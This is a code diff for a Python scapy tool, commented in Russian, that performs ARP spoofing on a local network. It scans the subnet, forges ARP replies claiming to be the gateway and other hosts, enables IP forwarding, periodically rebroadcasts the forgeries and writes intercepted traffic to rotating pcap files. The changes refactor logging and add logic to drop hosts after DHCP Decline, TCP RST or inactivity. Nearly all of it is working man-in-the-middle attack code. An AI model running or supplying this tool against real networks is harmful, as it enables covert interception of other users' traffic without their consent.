@@ -6,8 +6,8 @@ from scapy.all import *
 import queue
 from queue import Empty
 
-from scapy.layers.dhcp import DHCP
-from scapy.layers.inet import IP
+from scapy.layers.dhcp import DHCP, BOOTP
+from scapy.layers.inet import IP, TCP
 from scapy.layers.l2 import ARP, Ether
 from scapy.utils import PcapWriter
 import os
@@ -24,7 +24,17 @@ rotate_output_len = 0
 PID = os.getpid()
 
 LOG_FILENAME = datetime.now().strftime('logfile_%H_%M_%S_%d_%m_%Y.log')
-log.basicConfig(level=log.INFO, filename=LOG_FILENAME, filemode="w", format="%(asctime)s %(levelname)s %(message)s")
+#log.basicConfig(level=log.INFO, filename=LOG_FILENAME, filemode="w", format="%(asctime)s %(levelname)s %(message)s")
+logger = log.getLogger(__name__) #Gets or creates logger. Using __name__ as name.
+logger.setLevel(log.INFO)
+handler = log.FileHandler(LOG_FILENAME, mode='w')
+formatter = log.Formatter("%(asctime)s %(levelname)s %(message)s")
+handler.setFormatter(formatter)
+logger.addHandler(handler)
+
+#sygnals
+SLEEP = "SLEEP"
+REMOVE = "REMOVE"
 
 def check_privileges():
     if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
@@ -44,7 +54,7 @@ def on_key_press(event):
         if verbose_enabled:
             print('Exiting program...')
         else:
-            log.info('Exiting program...')
+            logger.info('Exiting program...')
         keyboard.unhook_all()
         global PID
         os.system(f"sudo kill -9 {PID} > /dev/null")
@@ -63,12 +73,12 @@ def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
   """
     if target_ip != "0.0.0.0" and target_ip != "255.255.255.255":
         arp_to_victim_packet = Ether(dst=victim_mac) / ARP(op=2, psrc=target_ip, hwsrc=spoof_mac, hwdst=victim_mac)
-        sendp(arp_to_victim_packet, verbose=0, count=2)
+        sendp(arp_to_victim_packet, verbose=0, count=1)
 
     if bidirectional:
         if victim_ip != "0.0.0.0" and victim_ip != "255.255.255.255":
             arp_to_target_packet = Ether(dst=target_mac) / ARP(op=2, psrc=victim_ip, hwsrc=spoof_mac, hwdst=target_mac)
-            sendp(arp_to_target_packet, verbose=0, count=2)
+            sendp(arp_to_target_packet, verbose=0, count=1)
 
     if verbose_enabled:
         print(f"Был перехвачен кадр от {victim_ip} ({victim_mac}) -> к {target_ip} ({target_mac})")
@@ -81,9 +91,9 @@ def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
         # if bidirectional:
         #     print(f"Для этого Получателю был выслан кадр:", arp_to_target_packet.show())
     else:
-        log.info(f"Send spoof that {target_ip} ({target_mac}) is {target_ip} ({spoof_mac})")
+        logger.info(f"Send spoof that {target_ip} ({target_mac}) is {target_ip} ({spoof_mac})")
         if bidirectional:
-            log.info(f"Send spoof that {victim_ip} ({victim_mac}) is {victim_ip} ({spoof_mac})")
+            logger.info(f"Send spoof that {victim_ip} ({victim_mac}) is {victim_ip} ({spoof_mac})")
 
 class Sniffer:
     def __init__(self, interface="eth0", queue=None, pcap_name="", rotate_output_len=0):
@@ -103,14 +113,15 @@ class Sniffer:
         """
         # Запись трафика в pcap файл
         if self.pcap_name != "":
-            self.file_num = 1
             #pcap = str(pcap_name.partition("."))[0]
             self.pcap_name_real = datetime.now().strftime(f'{self.pcap_name}_%H_%M_%S_%d_%m_%Y.pcap')
             self.pktdump = PcapWriter(self.pcap_name_real, append=True, sync=True)
-            self.last_check_time = time.time()
+            
         if self.rotate_output_len != 0:
             self.log_filename = LOG_FILENAME
+            self.last_check_time = time.time()
             self.log_file_num = 1
+            self.file_num = 1
         while True:
             try:
                 # Начинаем захват пакетов
@@ -119,7 +130,7 @@ class Sniffer:
                 if verbose_enabled:
                     print(f"Ошибка сети: {e}")
                 else:
-                    log.error(f"Net error: {e}")
+                    logger.error(f"Net error: {e}")
                 restart_network_service()
                 # Повторно пробуем инициализировать сетевой интерфейс
                 try:
@@ -127,28 +138,47 @@ class Sniffer:
                     if verbose_enabled:
                         print(f"Сетевой интерфейс '{self.interface}' активирован.")
                     else:
-                        log.error(f"Interface '{self.interface}' activated.")
+                        logger.error(f"Interface '{self.interface}' activated.")
                 except OSError as e:
                     if verbose_enabled:
                         print(f"Ошибка: Не удалось активировать сетевой интерфейс '{self.interface}'")
                     else:
-                        log.error(f"Error: Unable to activate net interface '{self.interface}'")
+                        logger.error(f"Error: Unable to activate net interface '{self.interface}'")
                     time.sleep(5)  # Ожидание перед попыткой перезапуска
 
         # Функция для обработки пакетов
     def packet_handler(self, packet):
         #nonlocal queue
-        
+        global logger
 
         if packet.haslayer(DHCP):
             victim_ip = packet[IP].src if packet.haslayer(IP) else packet[ARP].psrc
             target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst
 
-            if target_ip not in self.known_ips:
-                self.known_ips.append(target_ip)
-            if victim_ip not in self.known_ips:
-                self.known_ips.append(victim_ip)
-            pass # to avoid eternal reconnecting
+            if packet[DHCP].options[0][1] == 4:  # DHCP Decline (option 4)
+                #Extract the client IP from the DHCP packet. Handle potential exceptions if the field is missing.
+                try:
+                    client_ip = packet[BOOTP].fields['ciaddr']
+                    if client_ip in self.known_ips:
+                        self.known_ips.remove(client_ip)
+
+                    self.queue.put((client_ip, packet[Ether].src))
+                    self.queue.put((REMOVE, REMOVE))
+                    logger.info(f"DHCP Decline detected for client IP: {client_ip}, removing it from ip base")
+                except KeyError:
+                    logger.warning("DHCP Decline packet missing 'client_ip' field!")
+            else:
+                if target_ip not in self.known_ips and target_ip != "255.255.255.255" and target_ip != "0.0.0.0":
+                    self.known_ips.append(target_ip)
+                    logger.info(f"DHCP new client appeared with IP: {target_ip} or {victim_ip}")
+                if victim_ip not in self.known_ips and victim_ip != "255.255.255.255" and victim_ip != "0.0.0.0":
+                    self.known_ips.append(victim_ip)
+                    logger.info(f"DHCP new client appeared with IP: {target_ip} or {victim_ip}")
+                self.queue.put((SLEEP, SLEEP))
+                self.queue.put((SLEEP, SLEEP))# to avoid eternal reconnecting
+                logger.info(f"DHCP packet appeared; Sleeping 15 secs to avoid eternal reconnecting")
+                time.sleep(15)
+
         elif packet.haslayer(ARP):
             # Извлекаем IP и MAC адреса
             if packet[ARP].op == 2:
@@ -196,29 +226,37 @@ class Sniffer:
             target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst
             target_mac = packet[ARP].hwdst if packet.haslayer(ARP) else packet[Ether].dst
 
-            if str(target_ip).rpartition(".")[0] == str(self.spoof_ip).rpartition(".")[0] and str(target_ip) != str(self.spoof_ip):
-                if target_mac != "ff:ff:ff:ff:ff:ff" and target_mac != "00:00:00:00:00:00" and target_ip != "255.255.255.255" and target_ip != "0.0.0.0":
-                    if target_ip not in self.queue.queue:
-                        self.queue.put((target_ip, target_mac))
-                        self.queue.put((target_ip, target_mac))
-                        if target_ip not in self.known_ips:
-                            self.known_ips.append(target_ip)
+            if packet.haslayer(TCP):
+                if packet[TCP].flags & 0x04:  # TCP RST flag
+                    if victim_ip in self.known_ips:
+                        self.known_ips.remove(victim_ip)
+                        self.queue.put((victim_ip, packet[Ether].src))
+                        self.queue.put((REMOVE, REMOVE))
+                        logger.info(f"TCP RST detected from: {victim_ip}, removing it from ip base")
+            else:
+                if str(target_ip).rpartition(".")[0] == str(self.spoof_ip).rpartition(".")[0] and str(target_ip) != str(self.spoof_ip):
+                    if target_mac != "ff:ff:ff:ff:ff:ff" and target_mac != "00:00:00:00:00:00" and target_ip != "255.255.255.255" and target_ip != "0.0.0.0":
+                        if target_ip not in self.queue.queue:
+                            self.queue.put((target_ip, target_mac))
+                            self.queue.put((target_ip, target_mac))
+                            if target_ip not in self.known_ips:
+                                self.known_ips.append(target_ip)
 
-            if str(victim_ip).rpartition(".")[0] == str(self.spoof_ip).rpartition(".")[0] and str(victim_ip) != str(self.spoof_ip):
-                if victim_mac != "ff:ff:ff:ff:ff:ff" and victim_mac != "00:00:00:00:00:00" and victim_ip != "255.255.255.255" and victim_ip != "0.0.0.0":
-                    if victim_ip not in self.queue.queue:
-                        self.queue.put((victim_ip, victim_mac))
-                        self.queue.put((victim_ip, victim_mac))
+                if str(victim_ip).rpartition(".")[0] == str(self.spoof_ip).rpartition(".")[0] and str(victim_ip) != str(self.spoof_ip):
+                    if victim_mac != "ff:ff:ff:ff:ff:ff" and victim_mac != "00:00:00:00:00:00" and victim_ip != "255.255.255.255" and victim_ip != "0.0.0.0":
+                        if victim_ip not in self.queue.queue:
+                            self.queue.put((victim_ip, victim_mac))
+                            self.queue.put((victim_ip, victim_mac))
 
-                        if victim_ip not in self.known_ips:
-                            self.known_ips.append(victim_ip)
+                            if victim_ip not in self.known_ips:
+                                self.known_ips.append(victim_ip)
         
 
         # Записываем пакет в pcap файл
         if self.pcap_name != "":
             self.pktdump.write(packet)
             if self.rotate_output_len != 0:
-                if time.time() - self.last_check_time >= 300: # Проверяем каждые 5 минут
+                if time.time() - self.last_check_time >= 60: # Проверяем каждые 1 минут
                     try:
                         statinfo = os.stat(self.pcap_name_real)
                         if statinfo.st_size >= (self.rotate_output_len):
@@ -227,28 +265,42 @@ class Sniffer:
                             self.pcap_name_real = datetime.now().strftime(f'{self.pcap_name}_%H_%M_%S_%d_%m_%Y_rotated_{self.file_num}.pcap')
                             
                             self.pktdump = PcapWriter(self.pcap_name_real, append=True, sync=True)
-                            log.info(f"PCAP file rotated, new one is {self.pcap_name_real}")
-                        
-                        statinfo = os.stat(self.log_filename)
-                        if statinfo.st_size >= (self.rotate_output_len):
-                            log.shutdown()
-
-                            self.log_filename = datetime.now().strftime(f'logfile_%H_%M_%S_%d_%m_%Y_rotated_{self.log_file_num}.log')
-
-                            self.log_file_num += 1
-                            log.info(f"LOG file rotated, new one is {self.log_filename}")
-                            
-                            log.basicConfig(level=logging.INFO, filename=self.log_filename, filemode="w",
-                                    format="%(asctime)s %(levelname)s %(message)s")
-                            log.info(f"LOG file rotated, new one is {self.log_filename}")
-                        
-                        self.last_check_time = time.time()
+                            logger.info(f"PCAP file rotated, new one is {self.pcap_name_real}")
                     except FileNotFoundError:
-                        print(f"Error: File not found. Please ensure the directory exists.")
+                        logger.error(f"Error: PCAP file not found. Please ensure the directory {self.pcap_name_real} exists.")
                     except OSError as e:
-                        print(f"An OS error occurred: {e}")
+                        logger.error(f"An OS error occurred with pcap: {e}")
                     except Exception as e:
-                        print(f"An unexpected error occurred: {e}")
+                        logger.error(f"An unexpected error occurred with pcap: {e}")
+        if self.rotate_output_len != 0:
+            if time.time() - self.last_check_time >= 60: # Проверяем каждые 1 минут
+                try:    
+                    statinfo = os.stat(self.log_filename)
+                    if statinfo.st_size >= (self.rotate_output_len):
+                        self.log_file_num += 1
+                        self.log_filename = datetime.now().strftime(f'logfile_%H_%M_%S_%d_%m_%Y_rotated_{self.log_file_num}.log')
+                        global handler
+                        logger.info(f"LOG file rotated, new one is {self.log_filename}")
+                        
+                        logger.removeHandler(handler)  #remove old handler
+                        handler.close() #close the handler
+
+                        # logger.basicConfig(level=logging.INFO, filename=self.log_filename, filemode="w",
+                        #         format="%(asctime)s %(levelname)s %(message)s")
+                        
+                        handler = log.FileHandler(self.log_filename, mode='w') #Create new handler
+                        handler.setFormatter(formatter)
+                        
+                        logger.addHandler(handler) #Add the new handler
+                        logger.info(f"LOG file rotated, new one is {self.log_filename}")
+                    
+                    self.last_check_time = time.time()
+                except FileNotFoundError:
+                    logger.error(f"Error: Log file not found. Please ensure the directory {self.log_filename} exists.")
+                except OSError as e:
+                    logger.error(f"An OS error occurred with logfile: {e}")
+                except Exception as e:
+                    logger.error(f"An unexpected error occurred with logfile: {e}")
 
 
 def restart_network_service():
@@ -260,12 +312,12 @@ def restart_network_service():
         if verbose_enabled:
             print("Сетевая служба перезапущена.")
         else:
-            log.error("Net service restarted.")
+            logger.error("Net service restarted.")
     except FileNotFoundError:
         if verbose_enabled:
             print("Ошибка: systemctl не найден.")
         else:
-            log.error("Error: systemctl not found.")
+            logger.error("Error: systemctl not found.")
 
 
 def restart_network_interface(interface):
@@ -278,12 +330,12 @@ def restart_network_interface(interface):
         if verbose_enabled:
             print("Сетевой интерфейс перезапущен.")
         else:
-            log.error("Interface restarted.")
+            logger.error("Interface restarted.")
     except FileNotFoundError as e:
         if verbose_enabled:
             print(f"Ошибка: {e}")
         else:
-            log.error(f"Error: {e}")
+            logger.error(f"Error: {e}")
 
 
 def get_gateway_mac(gateway):
@@ -326,19 +378,19 @@ def network_arp_discovery(interface="eth0", gateway_ip="", gateway_mac=""):
                 progress.update(task, advance=1)
         os.system("clear")
     else:
-        log.info(f"Studying local network {network}...")
+        logger.info(f"Studying local network {network}...")
         for i in range(1, 255):
             target_ip = str(get_if_addr(interface)).rpartition(".")[0] + f".{i}"
             arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                                               psrc=spoof_ip, hwsrc=spoof_mac)
 
             ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
-            log.info(f"Sent arp to {target_ip}")
+            logger.info(f"Sent arp to {target_ip}")
             if gateway_ip != "":
                 for sent, received in ans:
                     arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)
-                    log.info(f"Have arp answ that {target_ip} is at {received.hwsrc}")
-                    log.info(f"Send spoof to {target_ip} that we are gateway {gateway_ip}")
+                    logger.info(f"Have arp answ that {target_ip} is at {received.hwsrc}")
+                    logger.info(f"Send spoof to {target_ip} that we are gateway {gateway_ip}")
                     local_ips.append(received.psrc)
     verbose_enabled = __verbose_state
     if verbose_enabled:
@@ -352,7 +404,7 @@ def main():
     # default_gateway = str(get_if_addr(default_if)).rpartition(".")[0] + ".1"
 
     os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
-    log.info("Activated port forwarding")
+    logger.info("Activated port forwarding")
 
     parser = argparse.ArgumentParser(description="ARP-подделка с обнаружением новых устройств.")
     if len(sys.argv) == 1:
@@ -386,13 +438,13 @@ def main():
     quiet_mode = True if str(args.quiet_mode).lower() == 'true' else False
     global rotate_output_len
     rotate_output_len = int(args.rotate_output_len) * 1024 * 1024 # В Мбайтах
-
-    log.info(f"Got arguments: interface={interface}, spoof_ip={spoof_ip}, spoof_mac={spoof_mac}, gateway_ip={gateway_ip}, gateway_mac={gateway_mac},pcap_name={pcap_name}, verbose_enabled={verbose_enabled}, quiet_mode={quiet_mode}, rotate_output_len={rotate_output_len}")
+    logger.info(f"Got arguments: interface={interface}, spoof_ip={spoof_ip}, spoof_mac={spoof_mac}, gateway_ip={gateway_ip}, gateway_mac={gateway_mac},pcap_name={pcap_name}, verbose_enabled={verbose_enabled}, quiet_mode={quiet_mode}, rotate_output_len={rotate_output_len}")
     
     if quiet_mode:
         renew_arp_spoof_time = 30 # количество секунд до переотправки в эфир подделки собой всех найденных локальных ip (по желанию может быть вынесено в атрибуты командной строки)
     else:
         renew_arp_spoof_time = 2
+    max_silent_time = 120
     
     # Создаем очередь для передачи данных
     queue = Queue()
@@ -403,7 +455,7 @@ def main():
     sniff_thread = threading.Thread(target=sniffer.sniff_and_find_new_devices, args=())
     sniff_thread.daemon = True  # Делаем поток фоновым
     sniff_thread.start()
-    log.info("Started sniffing thread")
+    logger.info("Started sniffing thread")
     time.sleep(1)
 
     if verbose_enabled:
@@ -420,10 +472,11 @@ def main():
         old_list += network_arp_discovery(interface, gateway_ip, gateway_mac)
         if gateway_ip not in old_list:
             old_list.append(gateway_ip)
-        last_spoof_time[gateway_ip] = time.time()
     else:
         old_list += network_arp_discovery(interface)
-    log.info(f"Studying local network gave us devices: {old_list}")
+    for ip in old_list:
+        last_spoof_time[ip] = time.time()
+    logger.info(f"Studying local network gave us devices: {old_list}")
 
     while True:
         try:
@@ -437,45 +490,59 @@ def main():
             # Извлекаем данные из очереди
             victim_ip, victim_mac = queue.get(timeout=1)
             target_ip, target_mac = queue.get(timeout=1)
-            #print("got a packet!!!")
-            if target_ip != spoof_ip and victim_ip != spoof_ip and target_mac != spoof_mac and victim_mac != spoof_mac:
+            if SLEEP in target_ip or SLEEP in victim_ip or SLEEP in target_mac or SLEEP in victim_mac:
+                time.sleep(15)
+            elif REMOVE in target_ip or REMOVE in target_mac:
+                if victim_ip in old_list:
+                    old_list.remove(victim_ip)
+                    last_spoof_time.pop(victim_ip)
+                    logger.info(f"Address {victim_ip} removed, now ip base is {old_list}")
+            elif target_ip != spoof_ip and victim_ip != spoof_ip and target_mac != spoof_mac and victim_mac != spoof_mac:
                 if target_ip not in old_list:
                     # Добавляем запрашиваемое устройство в очередь
                     old_list.append(target_ip)
-                    log.info(f"Found new ip, my ip_base is know {old_list}")
+                    logger.info(f"Found new ip, my ip_base is know {old_list}")
                     # Отправляем ARP-подделку для нового запрашиваемого устройства сразу
                     arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                     last_spoof_time[target_ip] = time.time()
                 else:
                     # Проверяем время последней ARP-подделки для этого устройства
-                    if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 15:
+                    if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= int(max_silent_time/8):
                         # Отправляем ARP-подделку, если прошло более 15 секунд
                         arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                         last_spoof_time[target_ip] = time.time()
             if time.time() - global_resend_time >= renew_arp_spoof_time:
                 # Переотправка в эфир подделки собой всех найденных локальных ip
-                log.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
+                logger.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
                 for i in range(len(old_list)):
                     arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
-                    log.info(f"Resent arp spoof about {old_list[i]}")
-                    sendp(arp_packet, verbose=0, count=3)
+                    logger.info(f"Resent arp spoof about {old_list[i]}")
+                    sendp(arp_packet, verbose=0, count=1)
                     global_resend_time = time.time()
+                
+                for ip in old_list:
+                    if ip != gateway_ip and ip in list(last_spoof_time.keys()): 
+                        if time.time() - last_spoof_time[ip] >= max_silent_time:
+                            old_list.remove(ip)
+                            last_spoof_time.pop(ip)
+                            logger.info(f"Address {ip} removed because of inactivity, now ip base is {old_list}")
+            
         except Empty:
             # Ожидаем новые данные
             if time.time() - global_resend_time >= renew_arp_spoof_time:
                 # Переотправка в эфир подделки собой всех найденных локальных ip
-                log.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
+                logger.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
                 for i in range(len(old_list)):
                     arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
-                    log.info(f"Resent arp spoof about {old_list[i]}")
-                    sendp(arp_packet, verbose=0, count=3)
+                    logger.info(f"Resent arp spoof about {old_list[i]}")
+                    sendp(arp_packet, verbose=0, count=1)
                     global_resend_time = time.time()
             pass
         except OSError as e:
             if verbose_enabled:
                 print(f"Ошибка сети: {e}")
             else:
-                log.error(f"Net error: {e}")
+                logger.error(f"Net error: {e}")
             restart_network_service()
             # Повторно пробуем инициализировать сетевой интерфейс
             try:
@@ -483,12 +550,12 @@ def main():
                 if verbose_enabled:
                     print(f"Сетевой интерфейс '{interface}' активирован.")
                 else:
-                    log.error(f"Net interface '{interface}' activated.")
+                    logger.error(f"Net interface '{interface}' activated.")
             except OSError as e:
                 if verbose_enabled:
                     print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
                 else:
-                    log.error(f"Error: Unable to activate net interface '{interface}'")
+                    logger.error(f"Error: Unable to activate net interface '{interface}'")
                 time.sleep(5)  # Ожидание перед попыткой перезапуска
 
 
